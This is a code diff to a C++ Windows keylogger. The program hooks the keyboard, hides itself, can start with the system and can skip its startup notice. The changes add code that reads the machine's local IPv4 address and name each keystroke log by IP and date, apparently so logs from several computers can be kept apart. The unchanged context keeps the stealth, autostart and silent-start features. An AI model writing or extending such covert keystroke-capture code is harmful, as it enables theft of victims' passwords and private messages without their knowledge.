@@ -1,4 +1,8 @@
 #define UNICODE
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#pragma comment(lib, "Ws2_32.lib")
+
 #include <Windows.h>
 #include <cstring>
 #include <cstdio>
@@ -260,6 +264,84 @@ bool SetSilentMode(bool enable)
     return result;
 }
 
+// 获取本机 IPv4 地址（第一个非回环 IPv4 地址），失败返回 "unknown"
+std::string GetLocalIPAddress()
+{
+    std::string ip = "unknown";
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+        return ip;
+
+    char hostname[256] = {0};
+    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
+    {
+        WSACleanup();
+        return ip;
+    }
+
+    struct addrinfo hints;
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_INET; // IPv4
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    struct addrinfo* result = nullptr;
+    if (getaddrinfo(hostname, NULL, &hints, &result) != 0)
+    {
+        WSACleanup();
+        return ip;
+    }
+
+    for (struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next)
+    {
+        if (ptr->ai_family == AF_INET)
+        {
+            char ipstr[INET_ADDRSTRLEN] = {0};
+            sockaddr_in* sa = (sockaddr_in*)ptr->ai_addr;
+            InetNtopA(AF_INET, &sa->sin_addr, ipstr, INET_ADDRSTRLEN);
+            std::string candidate(ipstr);
+            if (candidate != "127.0.0.1" && !candidate.empty())
+            {
+                ip = candidate;
+                break;
+            }
+            else if (ip == "unknown")
+            {
+                // 如果还没找到其他地址，临时使用回环地址
+                ip = candidate;
+            }
+        }
+    }
+
+    freeaddrinfo(result);
+    WSACleanup();
+    return ip;
+}
+
+std::string GetDateString()
+{
+    char buf[32] = {0};
+    time_t t = time(NULL);
+    struct tm tm_info;
+    localtime_s(&tm_info, &t);
+    // 格式：YYYYMMDD
+    strftime(buf, sizeof(buf), "%Y%m%d", &tm_info);
+    return std::string(buf);
+}
+
+std::string MakeOutputFilename()
+{
+    std::string ip = GetLocalIPAddress();
+    // 将 IP 中可能的非法字符（极少）替换为 '-'
+    for (char &c : ip)
+    {
+        if (c == '/' || c == '\\' || c == ':' || c == '*' || c == '?' || c == '\"' || c == '<' || c == '>' || c == '|')
+            c = '-';
+    }
+    std::string date = GetDateString();
+    return ip + "_" + date + ".log";
+}
+
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode >= 0)
@@ -301,7 +383,7 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
                 if (SetAutoStart(!enabled))
                 {
                     if (!enabled)
-                        MessageBox(NULL, L"已设置为开机自启 awa", L"自启设置", MB_OK);
+                        MessageBox(NULL, L"已设置为开机自啟 awa", L"自启设置", MB_OK);
                     else
                         MessageBox(NULL, L"已取消开机自启 qaq", L"自启设置", MB_OK);
                 }
@@ -356,7 +438,7 @@ int main()
 {
     Stealth();
     if (!IsSilentMode()) {
-        MessageBox(NULL, L"开录 q(≧▽≦q)\n\n快捷键小提示ww\nCtrl + Shift + Alt + P  暂停录制\nCtrl + Shift + Alt + Q  结束录制\nCtrl + Shift + Alt + S  设置/取消静默启动\n\n录制日志将保存在当前目录的keylogger.log文件中  ヾ(≧▽≦*)o", L"录制开始", MB_OK);
+        MessageBox(NULL, L"开录 q(≧▽≦q)\n\n快捷键小提示ww\nCtrl + Shift + Alt + P  暂停录制\nCtrl + Shift + Alt + Q  结束录制\nCtrl + Shift + Alt + S  设置/取消开机自启\nCtrl + Shift + Alt + D  设置/取消静默启动\n\n录制日志将保存在当前目录ヾ(≧▽≦*)o，文件名格式为 ip_日期.log  例：192.168.1.2_20251019.log", L"录制开始", MB_OK);
     }
 #ifdef bootwait 
     while (IsSystemBooting())
@@ -368,8 +450,9 @@ int main()
 #ifdef nowait 
     std::cout << "跳过系统启动检查。\n";
 #endif
-    const char* output_filename = "keylogger.log";
-    std::cout << "输出日志到 " << output_filename << std::endl; std::cout << "输出日志到 " << output_filename << std::endl;
+
+    std::string output_filename = MakeOutputFilename();
+    std::cout << "输出日志到 " << output_filename << std::endl;
 
     output_file.open(output_filename, std::ios_base::app);
 
